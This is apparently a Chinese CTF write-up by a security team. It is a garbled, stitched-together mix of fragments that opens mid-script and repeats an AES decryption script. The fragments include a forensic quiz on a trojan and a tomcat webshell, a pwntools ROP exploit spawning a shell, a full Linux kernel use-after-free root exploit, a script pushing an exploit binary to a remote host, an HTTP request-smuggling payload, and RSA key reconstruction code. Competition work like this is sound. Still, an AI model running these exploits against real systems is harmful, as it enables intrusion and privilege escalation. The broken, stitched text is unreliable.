11000000039bf3dceb80c7afbf98b3fa6566946bc5  
11000000033bac521ae26859766243c036301f87c4  
1100000003701efb644c3b550da6bc247b9e24fdac  
11000000033bac521ae26859766243c036301f87c4  
1100000003dd028d3eccfef7f6c0309077231c9fef  
11000000033bac521ae26859766243c036301f87c4  
1100000003e51f135650bcc65d29a8a527060eba8e  
11000000033bac521ae26859766243c036301f87c4  
1100000003fd69bdf4fe39a5c4133934c0401cbaa3  
11000000033bac521ae26859766243c036301f87c4  
11000000038977745e6e9182fb6a98bc7bb9411bdb  
11000000033bac521ae26859766243c036301f87c4  
1100000003eb7945413202a5ebf309e7767ccc90cd  
11000000033bac521ae26859766243c036301f87c4  
1100000003537edcc15a967af5f52547b8566fb61c  
11000000033bac521ae26859766243c036301f87c4  
110000000343490cb3331c98647416fefe2a5aa789  
  
'''.split("n")  
  
for each in s:  
enc = AES.new(key=bytes.fromhex('85aaa9cc1dc1043104935f4a658d6091940c45127da6398e885231908c0f5d1d'),iv=b'x00'*16,mode=AES.MODE_CBC)  
  
print(enc.decrypt(bytes.fromhex(each[10:])))

(8/10) 木马所控制机器的硬件编号是什么 示例:
00000BBBAAAAA
请输入你的答案 > F757C4A862675D1A5A5A
正确✅!

挨个应用尝试，发现是tomcat

(9/10) 攻击者对被感染机器的某些正常应用进行了进一步的可持续化维持,请找到被利用的应用 示例:
phpstudy 12.0
请输入你的答案 > apache tomcat 10.1.25
正确✅!

在tomcat目录下可以找到war包

(10/10) 攻击者部署webshell所使用的文件是什么 示例:
shell.php
请输入你的答案 > host.war
正确✅!
恭喜你完成了所有题目,这是你的flag 🚩 –>

结束

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
from pwn import*
from struct import pack
import ctypes
    #from LibcSearcher import *
from ae64 import AE64
def bug():
 gdb.attach(p)
 pause()
def s(a):
 p.send(a)
def sa(a,b):
 p.sendafter(a,b)
def sl(a):
 p.sendline(a)
def sla(a,b):
 p.sendlineafter(a,b)
def r(a):
 p.recv(a)
    #def pr(a):
 #print(p.recv(a))
def rl(a):
 return p.recvuntil(a)
def inter():
 p.interactive()
def get_addr64():
 return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
 return u32(p.recvuntil("xf7")[-4:])
def get_sb():
 return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
 return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

    
    #context(os='linux',arch='i386',log_level='debug')   
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')   
    #libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
    #libc=ELF('/lib/i386-linux-gnu/libc.so.6')
    #libc=ELF('libc-2.23.so') 
    #libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
    #libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
    #p=remote('',)
p = process('./pwn')

rax = 0x0000000000450277
rdi = 0x000000000040213f
rsi = 0x000000000040a1ae
rdx = 0x0000000000485feb
rbp = 0x0000000000401771
bss = 0x4C72A0 + 0x100
syscall = 0x000000000041ac26
leave_ret=0x40192F
rl(b"gift: ")
gift = int(p.recv(18),16)
li(hex(gift))
pay = p64(1)*8
s(pay)
rl("Wanna return?n")
s(b'a')
rl("once again?n")
pay = b'x40'*(0x100)
    #bug()
s(pay)

rl("once again?n")
pay = b'x11'*(0x108) + p64(gift)*2 + p64(rdi) + p64(0) + p64(rsi) + p64(bss) + p64(rdx) + p64(0xfff)*2 + p64(rax)+p64(0)+p64(syscall)+p64(rbp)+p64(bss)+p64(leave_ret)
    #bug()
sl(pay)

    #pause()
payload=b'/bin/shx00'+p64(rdi)+p64(bss)+p64(rsi)+p64(0)+p64(rdx)+p64(0)*2+p64(rax)+p64(0x3b)+p64(syscall)

s(payload)

inter()
    #define _GNU_SOURCE
    #include <err.h>
    #include 
    #include <sched.h>
    #include <net/if.h>
    #include <netinet/in.h>
    #include <sys/ipc.h>
    #include <sys/msg.h>
    #include <sys/socket.h>
    #include <stdint.h>
    #include <sys/prctl.h>
    #include <sys/types.h>
    #include <stdio.h>
// #include <linux/userfaultfd.h>
    #include 
    #include <errno.h>
    #include 
    #include <stdlib.h>
    #include <fcntl.h>
    #include <signal.h>
    #include <string.h>
    #include <sys/mman.h>
    #include <sys/syscall.h>
    #include <sys/ioctl.h>
    #include <sys/sem.h>
    #include <semaphore.h>
    #include 
    #include <time.h>

    #define MSG_COPY 040000
    #define MSG_TAG 0xAAAAAAAA
    #define PRIMARY_MSG_TYPE 0x41
    #define SECONDARY_MSG_TYPE 0x42

    #define MSG_QUEUE_NUM 4096

    #define PRIMARY_MSG_SIZE 96
    #define SECONDARY_MSG_SIZE 0x400
    #define VICTIM_MSG_TYPE 0x1337

    #define SOCKET_NUM 32
    #define SK_BUFF_NUM 128
    #define PIPE_NUM 256

size_t user_cs, user_ss, user_sp, user_rflags;
void save_status()
{
    __asm__(
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;");
    puts("[*]status has been saved.");
}

struct list_head
{
    struct list_head *next, *prev;
};

struct msg_msgseg
{
    uint64_t next;
};

struct msg_msg
{
    struct list_head m_list;
    long m_type;
    size_t m_ts;    /* message text size */
    void *next;     /* struct msg_msgseg *next; */
    void *security; /* NULL without SELinux */
    /* the actual message follows immediately */
};

struct pipe_buffer
{
    uint64_t page;
    uint32_t offset, len;
    uint64_t ops;
    uint32_t flags;
    uint32_t padding;
    uint64_t private;
};

struct pipe_buf_operations
{
    uint64_t confirm;
    uint64_t release;
    uint64_t try_steal;
    uint64_t get;
};

struct
{
    long mtype;
    char mtext[PRIMARY_MSG_SIZE - sizeof(struct msg_msg)];
} primary_msg;

struct
{
    long mtype;
    char mtext[SECONDARY_MSG_SIZE - sizeof(struct msg_msg)];
} secondary_msg;

void errExit(char *err_msg)
{
    puts(err_msg);
    exit(-1);
}

void get_shell()
{
    if (getuid())
    {
        printf(" 33[31m 33[1m[x] Failed to get the root! 33[0mn");
        exit(-1);
    }
    printf(" 33[32m 33[1m[+] Successful to get the root. Execve root shell now... 33[0mn");
    system("/bin/sh");
}

void print_hex(char *buf, int size)
{
    int i;
    puts("======================================");
    printf("data :n");
    for (i = 0; i < (size / 8); i++)
    {
        if (i % 2 == 0)
        {
            if (i / 2 < 10)
            {
                printf("%d  ", i / 2);
            }
            else if (i / 2 < 100)
            {
                printf("%d ", i / 2);
            }
            else
            {
                printf("%d", i / 2);
            }
        }
        printf(" %16llx", *(size_t *)(buf + i * 8));
        if (i % 2 == 1)
        {
            printf("n");
        }
    }
    puts("======================================");
}

unsigned long kernel_addr;
unsigned long kernel_base;
unsigned long kernel_offset;
int fd;

void create(int size)
{
    ioctl(fd, 0x0, size);
}

void delete()
{
    ioctl(fd, 1);
}

void obj_read(char *buf, int bufsize)
{
    read(fd, buf, bufsize);
}

void obj_write(char *buf, int bufsize)
{
    write(fd, buf, bufsize);
}

int my_read(int fd, char *buf, int size)
{
    char a;
    for (int i = 0; i < size; i++)
    {
        read(fd, &a, 1);
        if (a == 0xa || a == 0)
        {
            break;
        }
        buf[i] = a;
    }
    return 1;
}

int main()
{
    signal(SIGSEGV, get_shell);
    signal(SIGINT, get_shell);
    save_status();

    char *buf = malloc(0x4000);
    unsigned long *point_buf = malloc(0x4000);
    int victim_qid = -1;
    int sk_sockets[SOCKET_NUM][2];
    int msqid[MSG_QUEUE_NUM];
    char fake_secondary_msg[704];
    struct msg_msg *nearby_msg;
    struct msg_msg *nearby_msg_prim;
    unsigned long victim_addr;
    unsigned long search_addr;
    struct pipe_buffer *pipe_buf_ptr;
    int pipe_fd[PIPE_NUM][2];
    struct pipe_buf_operations *ops_ptr;
    unsigned long *rop_chain = malloc(0x2000);

    uint64_t start = 0, commit_creds = 0, init_cred = 0;
    uint64_t mov_rsp_rax = 0xffffffff818ad887;
    uint64_t mov_rax_rsi = 0xffffffff810a0e13;

    int file = open("/proc/kallsyms", O_RDONLY);
    if (file < 0)
    {
        printf("%dn", file);
        puts("[*]open kallsyms error!");
        exit(0);
    }

    char kallsyms_buf[0x30] = {0};
    while (my_read(file, kallsyms_buf, 0x30))
    {
        // if (strstr(kallsyms_buf, "commit_creds") && !commit_creds)
        // {
        //     char hex[20] = {0};
        //     strncpy(hex, kallsyms_buf, 16);
        //     sscanf(hex, "%llx", &commit_creds);
        //     printf("commit_creds addr: %pn", commit_creds);
        // }
        // if (strstr(kallsyms_buf, "init_cred") && !init_cred)
        // {
        //     char hex[20] = {0};
        //     strncpy(hex, kallsyms_buf, 16);
        //     sscanf(hex, "%llx", &init_cred);
        //     printf("init_cred addr: %pn", init_cred);
        // }
        if (strstr(kallsyms_buf, "startup_64") && !start)
        {
            char hex[20] = {0};
            strncpy(hex, kallsyms_buf, 16);
            sscanf(hex, "%llx", &start);
            init_cred = start + 0xe5a140;
            commit_creds = start + 0xac050;
            printf("startup_64 addr: %pn", start);
            printf("commit_creds addr: %pn", commit_creds);
            printf("init_cred addr: %pn", init_cred);
        }
        if (start && commit_creds && init_cred)
        {
            break;
        }
        memset(kallsyms_buf, ' ', 0x30);
    }

    fd = open("/dev/easy", O_RDWR);
    if (fd < 0)
    {
        puts("error open easy");
        exit(0);
    }

    puts("n 33[34m 33[1m[*] trigger UAF 33[0m");

    for (int i = 0; i < MSG_QUEUE_NUM; i++)
    {
        if ((msqid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) < 0)
            errExit("failed to create msg_queue!");
    }

    memset(&primary_msg, 0, sizeof(primary_msg));
    memset(&secondary_msg, 0, sizeof(secondary_msg));
    *(long *)&primary_msg = PRIMARY_MSG_TYPE;
    *(long *)&secondary_msg = SECONDARY_MSG_TYPE;
    *(int *)&primary_msg.mtext[0] = MSG_TAG;
    *(int *)&secondary_msg.mtext[0] = MSG_TAG;

    for (int i = 0; i < MSG_QUEUE_NUM; i++)
    {
        *(int *)&primary_msg.mtext[0] = MSG_TAG;
        *(int *)&primary_msg.mtext[4] = i;
        if (msgsnd(msqid[i], &primary_msg,
                   sizeof(primary_msg) - 8, 0) < 0)
            errExit("failed to send primary msg!");

        *(int *)&secondary_msg.mtext[0] = MSG_TAG;
        *(int *)&secondary_msg.mtext[8] = i;
        if (msgsnd(msqid[i], &secondary_msg,
                   sizeof(secondary_msg) - 8, 0) < 0)
            errExit("failed to send secondary msg!");
        if (i == 1024)
        {
            create(0x400);
            memset(buf, 'a', 0x400);
            obj_write(buf, 0x400);
            delete ();
        }
    }

    obj_read(buf, 0x400);
    print_hex(buf, 0x50);
    uint64_t next_msg_addr = *(uint64_t *)(buf + 8);
    int idx = *(int *)(buf + 0x38);
    *(uint64_t *)(buf + 0x20) = next_msg_addr + 0x20 - 0x60;
    *(uint64_t *)(buf + 0x18) = 0x1050;
    printf("next_msg_addr => %pn", next_msg_addr);
    printf("current_msg_idx => %dn", idx);
    obj_write(buf, 0x50);

    if (msgrcv(msqid[idx], buf, 0x1050, 1, MSG_COPY | IPC_NOWAIT) < 0)
    {
        puts("error recv");
        exit(-1);
    }

    print_hex(buf + 0x1000 - 0x30, 0x80);
    uint64_t current_msg_addr = *(uint64_t *)(buf + 0x1010);
    printf("current_msg_addr => %pn", current_msg_addr);

    obj_read(buf, 0x400);
    *(uint64_t *)(buf + 0x20) = 0;
    *(uint64_t *)(buf + 0x18) = 0x3d0;
    obj_write(buf, 0x50);

    if (msgrcv(msqid[idx], buf, 0x400, SECONDARY_MSG_TYPE, IPC_NOWAIT | MSG_NOERROR) < 0)
    {
        errExit("failed to read victim msg!");
    }

    for (int i = 0; i < PIPE_NUM; i++)
    {
        if (pipe(pipe_fd[i]) < 0)
            errExit("failed to create pipe!");

        if (write(pipe_fd[i][1], "196082", 6) < 0)
            errExit("failed to write the pipe!");
    }

    obj_read(buf, 0x400);

    uint64_t offset = start - 0xffffffff81000000;

    uint64_t push_rsi_pop_rsp_pop_1val_ret = 0xffffffff8133c5af + offset;
    uint64_t pop3_ret = 0xffffffff81002050 + offset;
    uint64_t pop_rdi = 0xffffffff81048955 + offset;
    uint64_t swapgs_pop = 0xffffffff81065354 + offset;
    uint64_t iretq = 0xffffffff8162dfee + offset;

    printf("push_rsi_pop_rsp_pop_1val_ret => %pn", push_rsi_pop_rsp_pop_1val_ret);

    uint64_t fake_ops[0x20] = {0};
    fake_ops[0] = 1;
    fake_ops[1] = push_rsi_pop_rsp_pop_1val_ret;
    fake_ops[2] = push_rsi_pop_rsp_pop_1val_ret;
    fake_ops[3] = push_rsi_pop_rsp_pop_1val_ret;
    fake_ops[4] = push_rsi_pop_rsp_pop_1val_ret;
    fake_ops[5] = 0;

    uint64_t rop_count = 1;
    *(uint64_t *)(buf + 8 * rop_count++) = pop3_ret;
    *(uint64_t *)(buf + 8 * rop_count++) = pop3_ret;
    *(uint64_t *)(buf + 8 * rop_count++) = pop3_ret;
    *(uint64_t *)(buf + 8 * rop_count++) = pop3_ret;
    *(uint64_t *)(buf + 8 * rop_count++) = pop_rdi;
    *(uint64_t *)(buf + 8 * rop_count++) = init_cred;
    *(uint64_t *)(buf + 8 * rop_count++) = commit_creds;
    *(uint64_t *)(buf + 8 * rop_count++) = swapgs_pop;
    *(uint64_t *)(buf + 8 * rop_count++) = 0;
    *(uint64_t *)(buf + 8 * rop_count++) = iretq;
    *(uint64_t *)(buf + 8 * rop_count++) = get_shell;
    *(uint64_t *)(buf + 8 * rop_count++) = user_cs;
    *(uint64_t *)(buf + 8 * rop_count++) = user_rflags;
    *(uint64_t *)(buf + 8 * rop_count++) = user_sp;
    *(uint64_t *)(buf + 8 * rop_count++) = user_ss;
    *(uint64_t *)(buf + 0x10) = (uint64_t *)fake_ops;

    obj_write(buf, 0x200);

    sleep(20);

    for (int i = 0; i < PIPE_NUM; i++)
    {
        close(pipe_fd[i][0]);
        close(pipe_fd[i][1]);
    }

    return 0;
}
from pwn import *
from sys import argv

r = remote('0192f63f439f7e97b7da08dd813722a8.w87i.dg02.ciihw.cn',43584)
context.log_level = 'debug'

def send_file(name, sym):
    file = read(name)
    f = b64e(file)
    size = 100
    print("each_size:", size)
    print(len(f))
    r.sendlineafter(sym, b"cd /tmp")
    r.sendlineafter(sym, b"rm *")
    r.sendlineafter(sym, b"touch /tmp/exp.gz.b64")
    total_count = 0
    if len(f) // size < len(f) / size:
        total_count = (len(f)//size)+1
    else:
        total_count = (len(f)//size)

    for i in range(len(f)//size):
        log.info("Sending chunk {}/{}".format(i+1, total_count))
        r.sendlineafter(
            sym, "echo -n '{}'>>/tmp/exp.gz.b64".format(f[i*size:(i*size)+size]))

    if len(f) // size < len(f) / size:
        i += 1
        log.info("remaining size: {}".format(len(f[i*size:])))
        log.info("Sending chunk {}/{}".format(i+1, total_count))
        r.sendlineafter(
            sym, "echo -n '{}'>>/tmp/exp.gz.b64".format(f[i*size:]))

    r.sendlineafter(sym, b"cat /tmp/exp.gz.b64 | base64 -d >/tmp/exp.gz")
    r.sendlineafter(sym, b"gzip -d /tmp/exp.gz")
    r.sendlineafter(sym, b"chmod +x /tmp/exp")
    # r.sendlineafter(sym, b"/tmp/exp")

def exploit():
    sym = b"$"
    os.system('rm exp.gz')
    os.system('cp ./exp ./exp.bak')
    os.system('gzip ./exp')
    os.system('mv exp.bak exp')
    send_file("exp.gz", sym=sym)

    r.interactive()

if __name__ == "__main__":
    exploit()
wbStego4.bmp
username: root456
password: *111!!```
GET / HTTP/1.1
Host: www.0-sec.org
Content-Length: 4
Transfer-Encoding : chunked

46
GET /wbStego4.bmp HTTP/1.1
Host:
www.0-sec.org
Content-Length:15

kk
0s
RW_IHZ.KFY&gt;HHS-IHZ AAAAB3NzaC1yc2EAAAADAQABAAABAHqSISYfkwuFeX20KTtyDhpG/nmyMK5MrmjKILUbLxpEtgw+4i0sIR4sWtNpGSVAMLZ4YO8EY6p7FBw0z4u0ALo2qC8I763lfKlNXH1WHWexRHd72MEpxpOzt79ukabEr7OWpRdDEISj3MyEalVNYGTKMt/TQWR/dnFd+TsDB2aRDBQQq9VfQhZ9Z864huQ4Du8PKg42plzfRPJsEhe4JpE0GW5QRap9ZNHM/4fSSHJlwqbBqGdeIjw+U7zY/RokxK979+f7SN6qMc9FzAUTnbwFGLpZe4ohz4pPJNrmRKfERTSKDoXw1krdDZuEZzCgiprpR8WqLvGoDXhYstcrgWU=
s = 'RW_IHZ.KFY&gt;HHS-IHZ AAAAB3NzaC1yc2EAAAADAQABAAABAHqSISYfkwuFeX20KTtyDhpG/nmyMK5MrmjKILUbLxpEtgw+4i0sIR4sWtNpGSVAMLZ4YO8EY6p7FBw0z4u0ALo2qC8I763lfKlNXH1WHWexRHd72MEpxpOzt79ukabEr7OWpRdDEISj3MyEalVNYGTKMt/TQWR/dnFd+TsDB2aRDBQQq9VfQhZ9Z864huQ4Du8PKg42plzfRPJsEhe4JpE0GW5QRap9ZNHM/4fSSHJlwqbBqGdeIjw+U7zY/RokxK979+f7SN6qMc9FzAUTnbwFGLpZe4ohz4pPJNrmRKfERTSKDoXw1krdDZuEZzCgiprpR8WqLvGoDXhYstcrgWU='
en='ABCDEFGHIJKLMNOPQRSTUVWXYZ'
de='ZYXWVUTSRQPONMLKJIHGFEDCBA'
result = ''
for i in range(0,len(s)):
if "Z"&gt;=s[i] &gt;= "A":
index = en.find(s[i])
result+=de[index]
else:
result = result+s[i]
print(result)
ssh-keygen -f id_rsa1.pub -e -m PKCS8 &gt; id_rsa_pkcs18.pem
openssl pkey -pubin -in id_rsa_pkcs18.pem -text -noout
s="""
7a:92:21:26:1f:93:0b:85:79:7d:b4:29:3b:72:0e:
1a:46:fe:79:b2:30:ae:4c:ae:68:ca:20:b5:1b:2f:
1a:44:b6:0c:3e:e2:2d:2c:21:1e:2c:5a:d3:69:19:
25:40:30:b6:78:60:ef:04:63:aa:7b:14:1c:34:cf:
8b:b4:00:ba:36:a8:2f:08:ef:ad:e5:7c:a9:4d:5c:
7d:56:1d:67:b1:44:77:7b:d8:c1:29:c6:93:b3:b7:
bf:6e:91:a6:c4:af:b3:96:a5:17:43:10:84:a3:dc:
cc:84:6a:55:4d:60:64:ca:32:df:d3:41:64:7f:76:
71:5d:f9:3b:03:07:66:91:0c:14:10:ab:d5:5f:42:
16:7d:67:ce:b8:86:e4:38:0e:ef:0f:2a:0e:36:a6:
5c:df:44:f2:6c:12:17:b8:26:91:34:19:6e:50:45:
aa:7d:64:d1:cc:ff:87:d2:48:72:65:c2:a6:c1:a8:
67:5e:22:3c:3e:53:bc:d8:fd:1a:24:c4:af:7b:f7:
e7:fb:48:de:aa:31:cf:45:cc:05:13:9d:bc:05:18:
ba:59:7b:8a:21:cf:8a:4f:24:da:e6:44:a7:c4:45:
34:8a:0e:85:f0:d6:4a:dd:0d:9b:84:67:30:a0:8a:
9a:e9:47:c5:aa:2e:f1:a8:0d:78:58:b2:d7:2b:81:
65
"""
s=s.replace(":","").replace("n","").replace(" ","")
decimal_number = int(s, 16)

print("十进制数字:", decimal_number)
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPrivateNumbers
from sympy import mod_inverse

# 已知的 RSA 参数
p = 124391046068661849479368048442368264528688137061859889420748135089530711531982879099228365579453507914971808645098707899792342947071605270753221189146520461936329644320307671256282476976106892669621936765657513838321041373894048138250076354093023213535042038834560618477692450327056145702068970492978556584563
q = 124391046068661849479368048442368264528688137061859889420748135089530711531982879099228365579453507914971808645098707899792342947071605270753221189146520461936329644320307671256282476976106892669621936765657513838321041373894048138250076354093023213535042038834560618477692450327056145702068970492978556583623

e = 65537
n = p * q
phi_n = (p - 1) * (q - 1)
d = mod_inverse(e, phi_n)
# 计算 dp, dq 和 qinv
dp = d % (p - 1)
dq = d % (q - 1)
qinv = pow(q, -1, p)

# 使用 `RSAPrivateNumbers` 构造 RSA 私钥对象
private_numbers = RSAPrivateNumbers(
p=p,
q=q,
d=d,
dmp1=dp,
dmq1=dq,
iqmp=qinv,
public_numbers=rsa.RSAPublicNumbers(e=e, n=n)
)
private_key = private_numbers.private_key(backend=default_backend())

# 导出私钥为 PEM 格式
private_key_pem = private_key.private_bytes(
encoding=serialization.Encoding.PEM,
format=serialization.PrivateFormat.TraditionalOpenSSL,
encryption_algorithm=serialization.NoEncryption()
)

# 将私钥保存为 PEM 文件
with open("private_key.pem", "wb") as f:
f.write(private_key_pem)

print("私钥已成功保存为 private_key.pem")
from Crypto.Cipher import AES  
  
enc = AES.new(key=bytes.fromhex('85aaa9cc1dc1043104935f4a658d6091940c45127da6398e885231908c0f5d1d'),iv=b'x00'*16,mode=AES.MODE_CBC)  
  
s='''7100000000e9ba158fdff498979e080818eb73f5a2f5a850d5beb8c77e0791d880146f98ae27b47023d656df40bfdbb9996f9cb3d7fd74140bfef2e71275a24510acf1439df35efeb32502a62206e4688de70ef5a4e74c3b3e0c6bb550e38b0b5deb9b5e3281a7f7e65efe8652d13882bb619f0f78  
71000000032bc8b1334e21da17bb95ec4e03d6b0c2d776daa95ae5e8dff288ca63b543d574fc9db7438b514bac4333f6a20f1f8da3bf16935b7deeae12c1e075e0da147adc148a33838f9d35ad4ecff03f09d0dcf00b01a0163be283f2863442503a6a23b251dc2bc6aa660db012002596c530ab76  
11000000039fbb23d18d68972f0ae6de8219190cb0  
1100000003b2d10af5854b91e2e764c986d1d64c18  
110000000323145f9a56536a180c113c5e21812c40  
11000000033bac521ae26859766243c036301f87c4  
7100000003bc4faceefa1dc31d452b7348201f65481831c0d0c7512eb13e5e1d258e8583b959e3239dd9f2f495ee0b384e24453898eb1b1b73003ac5c6d662940cb92bfcbabbaa4eed9ab68e13d118128053495cbbb6b42bdf31f01d3eb36b12f7ce110e5e092b082fd9c551834f26174faa1b16ad  
1100000003b92d5ac86208df769ece4abece0dc85f  
11000000033bac521ae26859766243c036301f87c4  
1100000003443a21e5c8a2bd68f64c38fa8288c44e  
11000000033bac521ae26859766243c036301f87c4  
11000000039bf3dceb80c7afbf98b3fa6566946bc5  
11000000033bac521ae26859766243c036301f87c4  
1100000003701efb644c3b550da6bc247b9e24fdac  
11000000033bac521ae26859766243c036301f87c4  
1100000003dd028d3eccfef7f6c0309077231c9fef  
11000000033bac521ae26859766243c036301f87c4  
1100000003e51f135650bcc65d29a8a527060eba8e  
11000000033bac521ae26859766243c036301f87c4  
1100000003fd69bdf4fe39a5c4133934c0401cbaa3  
11000000033bac521ae26859766243c036301f87c4  
11000000038977745e6e9182fb6a98bc7bb9411bdb  
11000000033bac521ae26859766243c036301f87c4  
1100000003eb7945413202a5ebf309e7767ccc90cd  
11000000033bac521ae26859766243c036301f87c4  
1100000003537edcc15a967af5f52547b8566fb61c  
11000000033bac521ae26859766243c036301f87c4  
110000000343490cb3331c98647416fefe2a5aa789  
  
'''.split("n")  
  
for each in s:  
enc = AES.new(key=bytes.fromhex('85aaa9cc1dc1043104935f4a658d6091940c45127da6398e885231908c0f5d1d'),iv=b'x00'*16,mode=AES.MODE_CBC)  
  
print(enc.decrypt(bytes.fromhex(each[10:])))
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]